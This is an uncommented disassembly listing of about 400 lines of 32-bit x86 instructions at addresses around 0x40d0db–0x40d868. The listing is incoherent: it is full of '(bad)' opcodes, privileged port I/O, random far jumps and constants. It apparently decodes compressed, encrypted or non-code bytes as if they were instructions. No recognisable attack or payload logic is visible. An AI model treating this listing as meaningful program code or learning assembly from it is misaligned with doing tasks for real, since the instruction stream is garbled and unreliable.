  40d0db:	and    BYTE PTR [edi-0x3c],bh
  40d0de:	js     0x40d0a8
  40d0e0:	and    al,0xd3
  40d0e2:	das    
  40d0e3:	xor    DWORD PTR [edi+0x74],0x4b
  40d0e7:	and    al,0xeb
  40d0e9:	sar    DWORD PTR [edi+eiz*4],0xd4
  40d0ed:	sbb    DWORD PTR [ecx],edx
  40d0ef:	std    
  40d0f0:	fmulp  st(3),st
  40d0f2:	mov    dh,0xc7
  40d0f4:	pusha  
  40d0f5:	ds out dx,al
  40d0f7:	mov    ecx,0x19bdcf98
  40d0fc:	push   cs
  40d0fd:	jge    0x40d0fc
  40d0ff:	leave  
  40d100:	pop    ds
  40d101:	pop    ss
  40d102:	sbb    eax,0x81c0edd1
  40d107:	enter  0x1af1,0xbf
  40d10b:	push   esi
  40d10c:	daa    
  40d10d:	enter  0x2129,0xfa
  40d111:	cwde   
  40d112:	pop    ecx
  40d113:	stos   BYTE PTR es:[edi],al
  40d114:	(bad)  
  40d115:	stos   BYTE PTR es:[edi],al
  40d116:	mov    esp,0x7fb9ab2c
  40d11b:	test   BYTE PTR [edi],bh
  40d11d:	fbld   TBYTE PTR [ebx-0x5]
  40d120:	mov    esp,0x7cc9cc8a
  40d125:	sbb    eax,0x27969729
  40d12a:	fldcw  WORD PTR [eax]
  40d12c:	in     eax,dx
  40d12d:	loopne 0x40d122
  40d12f:	cmp    eax,DWORD PTR [edx+0x68a45df]
  40d135:	sub    edx,DWORD PTR [ebx+0x2c0bf1c8]
  40d13b:	cmp    esi,DWORD PTR [esi+esi*1-0x41]
  40d13f:	out    dx,eax
  40d140:	(bad)  
  40d141:	sti    
  40d142:	aad    0x73
  40d144:	sub    eax,0x5567e29c
  40d149:	and    cl,BYTE PTR [ebp-0x3]
  40d14c:	push   ds
  40d14d:	fbstp  TBYTE PTR [ebx-0x1ecf28d5]
  40d153:	ins    BYTE PTR es:[edi],dx
  40d154:	mov    bh,0x35
  40d156:	loop   0x40d13d
  40d158:	mov    DWORD PTR [esi+0x73],ebx
  40d15b:	adc    DWORD PTR [ebx-0x46],ecx
  40d15e:	inc    ebx
  40d15f:	push   edi
  40d160:	int3   
  40d161:	xchg   esp,eax
  40d162:	int3   
  40d163:	mov    ebx,0x6799e25c
  40d168:	pushf  
  40d169:	lods   al,BYTE PTR ds:[esi]
  40d16a:	ds dec ebx
  40d16c:	retf   
  40d16d:	xor    ecx,ebp
  40d16f:	xchg   DWORD PTR [ebx-0x4e2b02a8],ebx
  40d175:	jb     0x40d1d0
  40d177:	icebp  
  40d178:	(bad)  
  40d179:	dec    esp
  40d17a:	pop    eax
  40d17b:	enter  0x686d,0x38
  40d17f:	sar    BYTE PTR [edi+0x5f],0x4a
  40d183:	or     ebp,ebx
  40d185:	jne    0x40d14d
  40d187:	xor    DWORD PTR [eax],esp
  40d189:	push   edx
  40d18a:	mov    ebx,0x22069964
  40d18f:	loopne 0x40d17c
  40d191:	shl    ebp,1
  40d193:	xor    dh,BYTE PTR [edi]
  40d195:	stos   BYTE PTR es:[edi],al
  40d196:	or     al,BYTE PTR [ebx-0x79d2c615]
  40d19c:	mov    dl,0x75
  40d19e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d19f:	cmp    al,0x8d
  40d1a1:	fidivr WORD PTR [ebx+0x48b7a276]
  40d1a7:	pushf  
  40d1a8:	cmp    ecx,DWORD PTR [edi+0x6b]
  40d1ab:	xchg   ebp,eax
  40d1ac:	jmp    0x40d153
  40d1ae:	inc    esp
  40d1af:	pop    edx
  40d1b0:	inc    esi
  40d1b1:	ror    BYTE PTR [esi],1
  40d1b3:	ret    
  40d1b4:	(bad)  
  40d1b5:	call   0xdefd83b8
  40d1ba:	int    0xf3
  40d1bc:	mov    edi,0x378828f2
  40d1c1:	or     dh,bl
  40d1c3:	fucomi st,st(3)
  40d1c5:	mov    ebp,ss
  40d1c7:	xchg   ebp,eax
  40d1c8:	call   0xb9df:0xfa11433f
  40d1cf:	lods   al,BYTE PTR ds:[esi]
  40d1d0:	inc    dx
  40d1d2:	es ins DWORD PTR es:[edi],dx
  40d1d4:	dec    eax
  40d1d5:	mov    bl,0xfc
  40d1d7:	shl    DWORD PTR [eax+0x63],cl
  40d1da:	hlt    
  40d1db:	iret   
  40d1dc:	xor    DWORD PTR [ecx+edi*1-0x76cc2238],ebp
  40d1e3:	mov    al,ds:0xf0534091
  40d1e8:	loop   0x40d224
  40d1ea:	arpl   ax,cx
  40d1ec:	dec    edx
  40d1ed:	shr    BYTE PTR [ebx-0x77],0x73
  40d1f1:	repnz in eax,dx
  40d1f3:	aas    
  40d1f4:	lahf   
  40d1f5:	or     ebx,DWORD PTR [esi]
  40d1f7:	retf   
  40d1f8:	jmp    0x40d1cd
  40d1fa:	push   cs
  40d1fb:	cmp    ebx,DWORD PTR [ecx]
  40d1fd:	sub    eax,0xc098992a
  40d202:	mov    ds:0xd9c6051,al
  40d207:	add    BYTE PTR [edi-0xb2040d1],ah
  40d20d:	iret   
  40d20e:	jnp    0x40d1db
  40d210:	pushf  
  40d211:	stc    
  40d212:	fidiv  WORD PTR [edi]
  40d214:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d215:	out    0x10,al
  40d217:	es jmp 0x40d20a
  40d21a:	loope  0x40d239
  40d21c:	inc    edx
  40d21d:	xor    eax,0xdffc71f9
  40d222:	jo     0x40d1a6
  40d224:	mov    al,ds:0x39cdb6bf
  40d229:	(bad)  
  40d22a:	std    
  40d22b:	mov    BYTE PTR [eax-0x27a25c8f],ch
  40d231:	adc    BYTE PTR [ecx-0x2430268a],dl
  40d237:	xchg   esp,eax
  40d238:	imul   eax
  40d23a:	and    eax,0xcddf354c
  40d23f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d240:	sub    DWORD PTR [edi+eiz*4],esi
  40d243:	cmp    dl,ch
  40d245:	push   eax
  40d246:	dec    ebp
  40d247:	pop    ecx
  40d248:	arpl   sp,di
  40d24a:	lods   eax,DWORD PTR ds:[esi]
  40d24b:	push   0x5ff1b610
  40d250:	mov    ebp,0xa6de3945
  40d255:	mov    esp,0x744317fb
  40d25a:	test   BYTE PTR [eax],bl
  40d25c:	hlt    
  40d25d:	sub    DWORD PTR [ecx-0x45],ebx
  40d260:	jmp    0x40d2e1
  40d262:	call   0x7c96:0x7599801a
  40d269:	inc    ebp
  40d26a:	add    eax,0xc5ea73ce
  40d26f:	dec    esi
  40d270:	sub    edx,DWORD PTR [ecx-0x28]
  40d273:	and    ch,BYTE PTR [edx]
  40d275:	pop    ebp
  40d276:	std    
  40d277:	add    DWORD PTR [edx+edi*1],eax
  40d27a:	xchg   ebp,eax
  40d27b:	in     eax,0x40
  40d27d:	or     esi,ebp
  40d27f:	(bad)  
  40d280:	jmp    0xb0a0:0xc9f8d3d9
  40d287:	mov    ch,bl
  40d289:	fisubr DWORD PTR [ecx]
  40d28b:	dec    eax
  40d28c:	inc    ebx
  40d28d:	loop   0x40d226
  40d28f:	mov    dl,0x7a
  40d291:	mov    esp,0x35ec81c
  40d296:	aad    0xbf
  40d298:	std    
  40d299:	or     cl,BYTE PTR [eax*1-0x31510d12]
  40d2a0:	xchg   ebx,eax
  40d2a1:	and    BYTE PTR [eax],cl
  40d2a3:	sub    ebx,DWORD PTR [ebx+0x305d1857]
  40d2a9:	fild   QWORD PTR [ecx]
  40d2ab:	inc    edx
  40d2ac:	ret    
  40d2ad:	retf   0x720a
  40d2b0:	in     eax,dx
  40d2b1:	add    bh,ch
  40d2b3:	sbb    ebx,edi
  40d2b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2b6:	(bad)
  40d2ba:	sub    al,0xc8
  40d2bc:	cmp    eax,0x3007cc0f
  40d2c1:	test   al,0xb0
  40d2c4:	loop   0x40d30e
  40d2c6:	push   esp
  40d2c7:	(bad)  
  40d2c8:	test   eax,0x7b71eac2
  40d2cd:	push   0x62c9f83
  40d2d2:	lea    ecx,[edx]
  40d2d4:	call   0x1cec:0x42afa6d8
  40d2db:	ins    BYTE PTR es:[edi],dx
  40d2dc:	cld    
  40d2dd:	shr    BYTE PTR [esi-0xb681426],1
  40d2e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2e4:	into   
  40d2e5:	push   es
  40d2e6:	push   ebp
  40d2e7:	xchg   ecx,eax
  40d2e8:	fcmovu st,st(7)
  40d2ea:	xchg   ebp,eax
  40d2eb:	out    dx,al
  40d2ec:	fwait
  40d2ed:	(bad)  
  40d2ee:	ja     0x40d34c
  40d2f0:	mov    edi,0x669ffc99
  40d2f5:	in     al,0xa0
  40d2f7:	lea    ebx,[ecx-0x70]
  40d2fa:	out    0xc9,eax
  40d2fc:	in     al,0xf0
  40d2fe:	aaa    
  40d2ff:	call   0xafea:0xf63d5605
  40d306:	jecxz  0x40d34b
  40d308:	out    dx,eax
  40d309:	fild   WORD PTR [eax+0x2d0b297f]
  40d30f:	imul   edi,DWORD PTR [ecx],0xb0aa6adf
  40d315:	sub    ah,BYTE PTR [ebp+0x5f79e3]
  40d31b:	int3   
  40d31c:	fidiv  WORD PTR [ecx-0x3d]
  40d31f:	adc    ebp,esp
  40d321:	dec    edi
  40d322:	inc    edx
  40d323:	sti    
  40d324:	xor    eax,0x2e22c83b
  40d329:	fmul   st(5),st
  40d32b:	jmp    0x40d371
  40d32d:	mov    ds:0x3e5b516e,eax
  40d332:	(bad)  
  40d333:	pop    ds
  40d334:	or     eax,0xda2efd94
  40d339:	dec    ebp
  40d33a:	jg     0x40d342
  40d33c:	mov    al,ds:0x90cde48b
  40d341:	jb     0x40d340
  40d343:	fs dec dx
  40d346:	xchg   BYTE PTR [ecx-0x266215],dl
  40d34c:	mov    dl,0x8a
  40d34e:	jns    0x40d33e
  40d350:	inc    esi
  40d351:	fistp  WORD PTR [edi+0x4d]
  40d354:	inc    esp
  40d355:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d356:	inc    ebp
  40d357:	rcl    DWORD PTR [esi+0x53],1
  40d35a:	std    
  40d35b:	add    DWORD PTR [edi],0x30
  40d35e:	xor    DWORD PTR [ecx],ebp
  40d360:	sbb    BYTE PTR [ebx],al
  40d362:	mov    bl,0xc8
  40d364:	add    al,0x2
  40d366:	dec    eax
  40d367:	shl    bh,cl
  40d369:	stc    
  40d36a:	push   ds
  40d36b:	push   edx
  40d36c:	jmp    0xdf74:0x37868bf6
  40d373:	aas    
  40d374:	push   eax
  40d375:	jge    0x40d317
  40d377:	(bad)
  40d37a:	sbb    dh,BYTE PTR [ecx+0x6982df0c]
  40d380:	arpl   WORD PTR [ecx],bp
  40d382:	mov    esp,0xe846ebe8
  40d387:	int3   
  40d388:	add    edi,DWORD PTR [ebx+edx*4-0x620e11f]
  40d38f:	jne    0x40d3e4
  40d391:	lock je 0x40d388
  40d394:	aas    
  40d395:	out    0xac,al
  40d397:	add    ch,bl
  40d399:	jecxz  0x40d3d9
  40d39b:	ins    BYTE PTR es:[edi],dx
  40d39c:	mov    bl,0xd1
  40d39e:	and    DWORD PTR [ebp+0x2c],eax
  40d3a1:	aam    0x8e
  40d3a3:	in     eax,0x73
  40d3a5:	je     0x40d3a4
  40d3a7:	fdiv   QWORD PTR [eax-0x41]
  40d3aa:	in     al,dx
  40d3ab:	out    0xde,al
  40d3ad:	mov    BYTE PTR [esi-0x52836bb8],dl
  40d3b3:	stos   DWORD PTR es:[edi],eax
  40d3b4:	fild   QWORD PTR [ebx+0x731ebcf6]
  40d3ba:	lds    ecx,FWORD PTR [eax]
  40d3bc:	stos   DWORD PTR es:[edi],eax
  40d3bd:	dec    ebx
  40d3be:	das    
  40d3bf:	xlat   BYTE PTR ds:[ebx]
  40d3c0:	pop    es
  40d3c1:	sub    ebp,edi
  40d3c3:	jb     0x40d3fe
  40d3c5:	mov    ds:0xf45f5785,al
  40d3ca:	fs enter 0x6e9c,0xc
  40d3cf:	dec    ebp
  40d3d0:	rol    BYTE PTR ds:0x83eb6d96,0x7
  40d3d7:	and    dl,ch
  40d3d9:	mov    edx,0xdf3bbcdf
  40d3de:	rcr    DWORD PTR [ebp-0x750544dc],0x8d
  40d3e5:	enter  0xf2fc,0xe9
  40d3e9:	arpl   WORD PTR [ebp+0x6db7b784],dx
  40d3ef:	enter  0x8c76,0x8a
  40d3f3:	xchg   esp,eax
  40d3f4:	(bad)  
  40d3f5:	push   ss
  40d3f6:	cli    
  40d3f7:	sbb    eax,0x2574ee6
  40d3fc:	push   0x7727fd68
  40d401:	mov    edx,0x905fc7e1
  40d406:	shl    DWORD PTR [ecx],cl
  40d408:	scas   al,BYTE PTR es:[edi]
  40d409:	sub    edx,ecx
  40d40b:	std    
  40d40c:	out    0x69,al
  40d40e:	clc    
  40d40f:	xchg   edx,eax
  40d410:	sbb    al,0x43
  40d412:	or     DWORD PTR [eax-0x44d498b3],0xffffff91
  40d419:	fild   QWORD PTR [edi]
  40d41b:	xor    eax,0xf2a76e49
  40d420:	test   al,0x1f
  40d422:	std    
  40d423:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d424:	lahf   
  40d425:	mov    dh,0xb8
  40d427:	test   BYTE PTR [ebx-0x43],0x54
  40d42b:	enter  0xb91,0x6a
  40d42f:	cmp    al,BYTE PTR [esi]
  40d431:	mov    eax,ds:0x4feb2b61
  40d436:	push   es
  40d437:	(bad)  
  40d438:	or     eax,0x8cb777a8
  40d43d:	fist   DWORD PTR [ebx+0x10c9815a]
  40d443:	and    ebp,esp
  40d445:	in     eax,dx
  40d446:	xchg   esp,eax
  40d447:	cmp    esp,esi
  40d449:	test   eax,0x9d2fb600
  40d44e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d44f:	enter  0xe57,0x3
  40d453:	sub    BYTE PTR [edi-0xb],0x50
  40d457:	aas    
  40d458:	out    0x70,eax
  40d45a:	push   ds
  40d45b:	push   cs
  40d45c:	and    eax,0x92697ca4
  40d461:	and    al,0xcb
  40d463:	leave  
  40d464:	in     eax,dx
  40d465:	pop    edx
  40d466:	test   ecx,esp
  40d468:	outs   dx,DWORD PTR ds:[esi]
  40d469:	adc    esi,DWORD PTR [ecx]
  40d46b:	adc    al,0x66
  40d46d:	mov    bl,0xfc
  40d46f:	inc    ebp
  40d470:	hlt    
  40d471:	adc    al,BYTE PTR [ecx-0x1a]
  40d474:	in     eax,0xb6
  40d476:	rol    edi,cl
  40d478:	scas   al,BYTE PTR es:[edi]
  40d479:	and    eax,0x9dc971b
  40d47e:	push   edi
  40d47f:	mov    esp,0x663b23eb
  40d484:	sub    eax,0xfb202b80
  40d489:	fcomip st,st(0)
  40d48b:	shr    dl,1
  40d48d:	xchg   ecx,eax
  40d48e:	mov    edi,0xfca4c77c
  40d493:	in     eax,0x52
  40d495:	cmc    
  40d496:	cmp    ch,BYTE PTR fs:[ebx+0x28c81150]
  40d49d:	inc    edi
  40d49e:	push   ebp
  40d49f:	xlat   BYTE PTR ds:[ebx]
  40d4a0:	popf   
  40d4a1:	adc    edi,edi
  40d4a3:	sbb    ch,ch
  40d4a5:	sbb    al,0x1d
  40d4a7:	adc    eax,0x2497dff8
  40d4ac:	jecxz  0x40d4ea
  40d4ae:	pop    eax
  40d4af:	enter  0x28dd,0xd1
  40d4b3:	mov    edx,0x91be49c0
  40d4b8:	int    0x89
  40d4ba:	sub    eax,0x3917e699
  40d4bf:	xor    eax,0x27e3e2d9
  40d4c4:	cmp    DWORD PTR [edx],0xffffffdb
  40d4c7:	shr    ch,1
  40d4c9:	jp     0x40d4ae
  40d4cb:	and    ebp,ebx
  40d4cd:	ret    0x39e8
  40d4d0:	mov    ds:0xfdbbfeca,eax
  40d4d5:	dec    ebp
  40d4d6:	mov    ecx,0x28bf8ae0
  40d4db:	lods   al,BYTE PTR ds:[esi]
  40d4dc:	mov    edi,0x1688f9df
  40d4e1:	jbe    0x40d47b
  40d4e3:	das    
  40d4e4:	pusha  
  40d4e5:	test   eax,0xdfe4d6e5
  40d4ea:	or     ecx,DWORD PTR [edi]
  40d4ec:	or     edi,DWORD PTR [ecx-0x4a]
  40d4ef:	xchg   ebp,eax
  40d4f0:	jns    0x40d4bf
  40d4f2:	retf   0x21bc
  40d4f5:	lods   eax,DWORD PTR ds:[esi]
  40d4f6:	ror    DWORD PTR [ecx],0x6d
  40d4f9:	cmp    BYTE PTR [ebp-0x6a401e3f],cl
  40d4ff:	add    al,0xfe
  40d501:	gs popf 
  40d503:	inc    edi
  40d504:	sub    ebp,edi
  40d506:	sbb    al,al
  40d508:	hlt    
  40d509:	push   ebx
  40d50a:	xchg   ebx,eax
  40d50b:	enter  0x98ef,0xee
  40d50f:	cmp    DWORD PTR [eax-0x145fbb81],esp
  40d515:	push   es
  40d516:	cs mov eax,esi
  40d519:	shr    BYTE PTR [edx+eiz*4+0x62],cl
  40d51d:	fbld   TBYTE PTR [edx]
  40d51f:	call   0x552bb5f8
  40d524:	jne    0x40d59d
  40d526:	cld    
  40d527:	add    eax,0x780ffc99
  40d52c:	sbb    bh,BYTE PTR [eax+0x174e303f]
  40d532:	fst    QWORD PTR [edi+0x44dbd92d]
  40d538:	sbb    DWORD PTR [edi-0x23],edi
  40d53b:	xchg   edx,eax
  40d53c:	xlat   BYTE PTR ds:[ebx]
  40d53d:	(bad)  
  40d53e:	pop    ecx
  40d53f:	bnd jmp 0x40d5a0
  40d542:	aam    0xbf
  40d544:	gs cmp esi,eax
  40d547:	push   edx
  40d548:	push   esi
  40d549:	(bad)  
  40d54b:	je     0x40d56b
  40d54d:	dec    ebp
  40d54e:	(bad)  
  40d54f:	jge    0x40d53d
  40d551:	sub    al,0xfd
  40d553:	ret    0x545c
  40d556:	jmp    0x48160870
  40d55b:	vandnps ymm6,ymm4,ymm1
  40d55f:	sbb    ah,BYTE PTR [esi+0x3af67f5f]
  40d565:	push   0x84e066fd
  40d56a:	and    BYTE PTR [ebx-0x38135bfd],0xba
  40d571:	adc    al,0x5f
  40d573:	mov    ebx,0x1666c2f5
  40d578:	sahf   
  40d579:	xchg   ebp,eax
  40d57a:	cld    
  40d57b:	pop    ss
  40d57c:	sbb    bh,BYTE PTR [eax-0x1e]
  40d57f:	ins    DWORD PTR es:[edi],dx
  40d580:	xor    esp,DWORD PTR [ebx]
  40d582:	sti    
  40d583:	shl    BYTE PTR [ebp-0x148ffa97],cl
  40d589:	dec    esp
  40d58a:	das    
  40d58b:	inc    ebx
  40d58c:	sub    eax,0x8bd1e466
  40d591:	fild   WORD PTR [esi-0x78]
  40d594:	call   0xdf4a:0x928c
  40d59a:	cmp    DWORD PTR [eax],esp
  40d59c:	mov    esp,0x2963d66c
  40d5a1:	outs   dx,BYTE PTR ds:[esi]
  40d5a2:	std    
  40d5a3:	cmp    DWORD PTR [esi+0x42fe4586],esp
  40d5a9:	scas   eax,DWORD PTR es:[edi]
  40d5aa:	sub    eax,0x193a5c8
  40d5af:	pop    ebp
  40d5b0:	clc    
  40d5b1:	ins    BYTE PTR es:[edi],dx
  40d5b2:	sub    edx,DWORD PTR [eax]
  40d5b4:	out    0x4f,al
  40d5b6:	sar    DWORD PTR [esi-0x629d53ba],0xeb
  40d5bd:	mov    ebp,0x6311e311
  40d5c2:	sbb    eax,0xfeb58dc8
  40d5c7:	mov    al,ds:0xa69db46c
  40d5cc:	jmp    0x40d5b7
  40d5ce:	ins    DWORD PTR es:[edi],dx
  40d5cf:	dec    ebp
  40d5d0:	mov    dh,0xc3
  40d5d2:	cmp    al,0x44
  40d5d4:	mov    ds,edi
  40d5d6:	lock les ebx,FWORD PTR [edi-0x512aa7fb]
  40d5dd:	push   ss
  40d5de:	std    
  40d5df:	out    0xa9,al
  40d5e1:	stos   BYTE PTR es:[edi],al
  40d5e2:	pop    ds
  40d5e3:	leave  
  40d5e4:	pop    esp
  40d5e5:	(bad)
  40d5e9:	int    0x70
  40d5eb:	dec    esi
  40d5ec:	xchg   DWORD PTR [ebx+0x66],eax
  40d5ef:	push   es
  40d5f0:	jmp    0x40d5ee
  40d5f2:	sub    eax,0x5f8aed27
  40d5f7:	adc    DWORD PTR [edi-0x21],0x2d27f733
  40d5fe:	xor    cl,ah
  40d600:	lahf   
  40d601:	loopne 0x40d5ff
  40d603:	jecxz  0x40d5e7
  40d605:	leave  
  40d606:	cmp    BYTE PTR [ebp+0x6d],ah
  40d609:	mov    eax,ds:0xedd28047
  40d60e:	(bad)  
  40d60f:	in     eax,dx
  40d610:	jbe    0x40d64b
  40d612:	mov    dh,0xc1
  40d614:	dec    ebx
  40d615:	ds mov ebx,0xfc985b21
  40d61b:	pusha  
  40d61c:	xchg   DWORD PTR [edx],edi
  40d61e:	dec    ebx
  40d61f:	jp     0x40d693
  40d621:	jecxz  0x40d64a
  40d623:	loopne 0x40d5b5
  40d625:	jmp    0x20ca:0x1eb349fc
  40d62c:	or     eax,0x3034f3c2
  40d631:	fisttp QWORD PTR [eax+ecx*4+0x44]
  40d635:	into   
  40d636:	jmp    0x41de83c
  40d63b:	jmp    0x40d5d1
  40d63d:	or     al,0x4a
  40d63f:	push   edx
  40d640:	sub    ah,dh
  40d642:	cld    
  40d643:	push   ecx
  40d644:	iret   
  40d645:	push   0x44f11852
  40d64a:	sbb    DWORD PTR [eax],ebp
  40d64c:	and    al,0xd8
  40d64e:	or     ecx,esi
  40d650:	pusha  
  40d651:	push   esp
  40d652:	popf   
  40d653:	mov    DWORD PTR [esi-0x22],0xbaec89c6
  40d65a:	add    esp,DWORD PTR [edx-0x5d]
  40d65d:	cwde   
  40d65e:	sbb    bl,ah
  40d660:	sbb    edx,esi
  40d662:	pop    ds
  40d663:	xor    cl,BYTE PTR [esi]
  40d665:	fild   QWORD PTR [ebp-0x32e8b010]
  40d66b:	shl    bl,0x6d
  40d66e:	std    
  40d66f:	rcl    esi,1
  40d671:	es ins BYTE PTR es:[edi],dx
  40d673:	sbb    eax,0xc7e851fb
  40d678:	pop    ebx
  40d679:	add    esp,DWORD PTR [ecx+0x67e496a9]
  40d67f:	ds or  eax,0x9224fd40
  40d685:	sub    esp,DWORD PTR [edx]
  40d687:	mov    dl,0xde
  40d689:	cwde   
  40d68a:	inc    ebp
  40d68b:	xor    dh,BYTE PTR [eax]
  40d68d:	rcl    dh,1
  40d68f:	retf   0x9f16
  40d692:	fisttp WORD PTR [ecx+0x4f]
  40d695:	sbb    al,0x96
  40d697:	leave  
  40d698:	mov    bh,0x53
  40d69a:	ficom  WORD PTR [ecx-0x15]
  40d69d:	scas   eax,DWORD PTR es:[edi]
  40d69e:	push   ecx
  40d69f:	scas   al,BYTE PTR es:[edi]
  40d6a0:	dec    esi
  40d6a1:	cmp    al,0x64
  40d6a3:	mov    ah,0xd2
  40d6a5:	(bad)  
  40d6a6:	popf   
  40d6a7:	push   ds
  40d6a8:	push   esp
  40d6a9:	pop    es
  40d6aa:	test   eax,0xc707eb1d
  40d6af:	clc    
  40d6b0:	jb     0x40d636
  40d6b2:	clc    
  40d6b3:	jne    0x40d6b4
  40d6b5:	dec    eax
  40d6b6:	mov    bh,0x18
  40d6b8:	stos   DWORD PTR es:[edi],eax
  40d6b9:	rcl    BYTE PTR [esp+ecx*8-0xa],cl
  40d6bd:	rcl    DWORD PTR ds:0xf8a1d98c,0x72
  40d6c4:	in     eax,0x40
  40d6c6:	mov    WORD PTR [eax],cs
  40d6c8:	cmp    DWORD PTR [edi-0x6419b0db],esi
  40d6ce:	fcom   DWORD PTR [edx]
  40d6d0:	xor    BYTE PTR [esp+ebp*1-0x42ccc4af],cl
  40d6d7:	ror    DWORD PTR [eax+ecx*1-0x23],cl
  40d6db:	jo     0x40d748
  40d6dd:	daa    
  40d6de:	in     al,dx
  40d6df:	int    0x9a
  40d6e1:	cwde   
  40d6e2:	and    dh,bh
  40d6e4:	add    edx,edi
  40d6e6:	nop
  40d6e7:	and    eax,0xdcccbf35
  40d6ec:	arpl   bx,ax
  40d6ee:	call   FWORD PTR [ebx+0x4d]
  40d6f1:	xor    DWORD PTR [eax-0x7d],edx
  40d6f4:	imul   ebp,ebp,0x76
  40d6f7:	(bad)  
  40d6f8:	in     al,dx
  40d6f9:	or     DWORD PTR [ecx+0x7660c616],esi
  40d6ff:	hlt    
  40d700:	inc    ebx
  40d701:	leave  
  40d702:	mov    ch,0xc8
  40d704:	in     al,dx
  40d705:	bound  esi,QWORD PTR [ecx+0x7d]
  40d708:	out    dx,al
  40d709:	gs stc 
  40d70b:	call   0x6d1a:0xb5a8a5eb
  40d712:	xchg   esi,eax
  40d713:	dec    esi
  40d714:	and    al,ch
  40d716:	sbb    cl,BYTE PTR gs:[edi]
  40d719:	fisub  WORD PTR [ecx]
  40d71b:	push   ds
  40d71c:	add    eax,0x8c041f1e
  40d721:	clc    
  40d722:	cld    
  40d723:	add    bh,BYTE PTR [esi]
  40d725:	test   eax,0x672b4685
  40d72a:	sbb    ecx,eax
  40d72c:	pop    ebx
  40d72d:	sub    ecx,DWORD PTR [ecx-0xe]
  40d730:	jecxz  0x40d745
  40d732:	jnp    0xa29e7925
  40d738:	retf   0xcdff
  40d73b:	idiv   BYTE PTR [edi+ecx*2-0x58203526]
  40d742:	cdq    
  40d743:	pop    ecx
  40d744:	push   ebx
  40d745:	add    DWORD PTR [eax+ebp*8-0x66],edi
  40d749:	mov    DWORD PTR [edx-0x29fdce6],ebp
  40d74f:	test   al,cl
  40d751:	lock or al,0x50
  40d754:	pop    esi
  40d755:	clc    
  40d756:	out    0xce,eax
  40d758:	jmp    0x3d76:0x4ed79a37
  40d75f:	in     al,0xf2
  40d761:	icebp  
  40d762:	adc    BYTE PTR [edi-0x1a],dh
  40d765:	lds    esi,FWORD PTR [esi+0x2b]
  40d768:	mov    ch,BYTE PTR [esp+ebx*1+0x6c1786e8]
  40d76f:	iret   
  40d770:	aad    0x4c
  40d772:	stc    
  40d773:	mov    cl,BYTE PTR [ebp+0x4f85bd69]
  40d779:	call   0x442c10b9
  40d77e:	xchg   ecx,eax
  40d77f:	pop    ds
  40d780:	jbe    0x40d7d5
  40d782:	mov    eax,0x66df5834
  40d787:	sahf   
  40d788:	(bad)  
  40d78a:	dec    edi
  40d78b:	test   BYTE PTR [esi+0x1452fdfb],ch
  40d791:	push   eax
  40d792:	xchg   edx,eax
  40d793:	push   edi
  40d794:	push   ebp
  40d795:	jp     0x40d731
  40d797:	xor    BYTE PTR [esi+esi*4],dl
  40d79a:	mov    esp,0x8add80ee
  40d79f:	scas   eax,DWORD PTR es:[edi]
  40d7a0:	sbb    al,0x4c
  40d7a2:	dec    ebx
  40d7a3:	cmc    
  40d7a4:	or     edi,DWORD PTR [eax]
  40d7a6:	outs   dx,DWORD PTR ss:[esi]
  40d7a8:	in     al,dx
  40d7a9:	out    dx,al
  40d7aa:	push   ss
  40d7ab:	jb     0x40d7e7
  40d7ad:	in     eax,dx
  40d7ae:	fsubr  QWORD PTR [ebx-0x2355b5cd]
  40d7b4:	(bad)  
  40d7b5:	mov    eax,ds:0xc119467c
  40d7ba:	pop    ebx
  40d7bb:	and    ah,BYTE PTR [ebx-0x2]
  40d7be:	std    
  40d7bf:	inc    eax
  40d7c0:	int    0x6f
  40d7c2:	fldenv [ebx]
  40d7c4:	leave  
  40d7c5:	repnz mov ah,0x95
  40d7c8:	das    
  40d7c9:	fcomip st,st(5)
  40d7cb:	inc    ecx
  40d7cc:	inc    ebp
  40d7cd:	fldcw  WORD PTR [edi-0x1b740ad3]
  40d7d3:	push   ss
  40d7d4:	adc    bl,BYTE PTR [edi+0x3a]
  40d7d7:	cmp    DWORD PTR [eax-0x519a496a],esi
  40d7dd:	les    edx,FWORD PTR [edi]
  40d7df:	enter  0xcfca,0x3f
  40d7e3:	out    dx,eax
  40d7e4:	jge    0x40d813
  40d7e6:	add    BYTE PTR [ebp-0x4e948514],bh
  40d7ec:	cmp    ecx,DWORD PTR [ecx-0x1e]
  40d7ef:	repnz xor edi,DWORD PTR [esi+ebx*8-0x39]
  40d7f4:	mov    edi,0x29a924eb
  40d7f9:	jae    0x40d859
  40d7fb:	or     bl,ch
  40d7fd:	jne    0x40d7e7
  40d7ff:	add    bl,bl
  40d801:	pop    ebx
  40d802:	cwde   
  40d803:	out    0x3d,eax
  40d805:	(bad)  
  40d807:	dec    esi
  40d808:	mov    bl,0x65
  40d80a:	aad    0x4e
  40d80c:	mov    ah,0x81
  40d80e:	sub    DWORD PTR [esi],ebx
  40d810:	pop    ds
  40d811:	cli    
  40d812:	cld    
  40d813:	inc    eax
  40d814:	pop    esp
  40d815:	pop    es
  40d816:	ficomp DWORD PTR es:[edi+0x9c84d04]
  40d81d:	mov    dh,0xec
  40d81f:	mov    esp,0x369d2456
  40d824:	pop    ebx
  40d825:	ss std 
  40d827:	test   BYTE PTR [ecx-0x32658181],ah
  40d82d:	push   ebx
  40d82e:	sub    eax,0xc6a871c8
  40d833:	cmp    BYTE PTR [eax],dh
  40d835:	jo     0x40d853
  40d837:	sbb    bl,ch
  40d839:	cmp    al,0xab
  40d83c:	fs frstpm(287 only) 
  40d83f:	ins    BYTE PTR es:[edi],dx
  40d840:	inc    esi
  40d841:	fild   QWORD PTR [ebx+0x2c993cb1]
  40d847:	jecxz  0x40d82a
  40d849:	sbb    esp,ecx
  40d84b:	mov    edx,0x8cfccf7b
  40d850:	push   0xb3de879c
  40d855:	test   al,0xdc
  40d857:	(bad)  
  40d858:	cld    
  40d859:	xor    DWORD PTR [ebx-0x2c],ecx
  40d85c:	and    al,0xfe
  40d85e:	adc    esi,DWORD PTR [esp+eiz*4]
  40d861:	xchg   ebx,eax
  40d862:	std    
  40d863:	add    DWORD PTR [esi+0x5d],ecx
  40d866:	fst    DWORD PTR [ecx]
  40d868:	icebp  
